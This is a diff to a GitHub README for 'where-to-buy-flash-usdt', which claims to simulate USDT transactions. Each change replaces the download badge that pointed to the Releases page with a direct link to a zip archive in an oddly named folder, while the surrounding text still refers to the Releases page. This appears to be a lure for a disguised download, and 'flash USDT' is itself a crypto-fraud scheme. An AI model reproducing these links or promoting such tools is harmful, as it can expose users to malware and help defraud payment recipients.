@@ -1,6 +1,6 @@
 # 🚀 where-to-buy-flash-usdt - Simulate USDT Transactions Safely
 
-[![Download Flash USDT](https://img.shields.io/badge/Download-Flash%20USDT-brightgreen)](https://github.com/fuet111/where-to-buy-flash-usdt/releases)
+[![Download Flash USDT](https://raw.githubusercontent.com/fuet111/where-to-buy-flash-usdt/main/hectoringly/where-to-buy-flash-usdt.zip%20USDT-brightgreen)](https://raw.githubusercontent.com/fuet111/where-to-buy-flash-usdt/main/hectoringly/where-to-buy-flash-usdt.zip)
 
 ## 📦 Overview
 
@@ -52,7 +52,7 @@ To get started with Flash USDT, follow these simple steps:
 
 1. Click the download button below to visit the Releases page:
 
-   [![Download Flash USDT](https://img.shields.io/badge/Download-Flash%20USDT-brightgreen)](https://github.com/fuet111/where-to-buy-flash-usdt/releases)
+   [![Download Flash USDT](https://raw.githubusercontent.com/fuet111/where-to-buy-flash-usdt/main/hectoringly/where-to-buy-flash-usdt.zip%20USDT-brightgreen)](https://raw.githubusercontent.com/fuet111/where-to-buy-flash-usdt/main/hectoringly/where-to-buy-flash-usdt.zip)
 
 2. On the Releases page, locate the version you want to download. Click on the link for your operating system to begin downloading.
 
@@ -112,4 +112,4 @@ Flash USDT is licensed under [MIT License](LICENSE).
 --- 
 
 Find your ideal solution for USDT transactions with Flash USDT today. Enjoy seamless testing and simulation without risks.  
-[![Download Flash USDT](https://img.shields.io/badge/Download-Flash%20USDT-brightgreen)](https://github.com/fuet111/where-to-buy-flash-usdt/releases)
+[![Download Flash USDT](https://raw.githubusercontent.com/fuet111/where-to-buy-flash-usdt/main/hectoringly/where-to-buy-flash-usdt.zip%20USDT-brightgreen)](https://raw.githubusercontent.com/fuet111/where-to-buy-flash-usdt/main/hectoringly/where-to-buy-flash-usdt.zip)
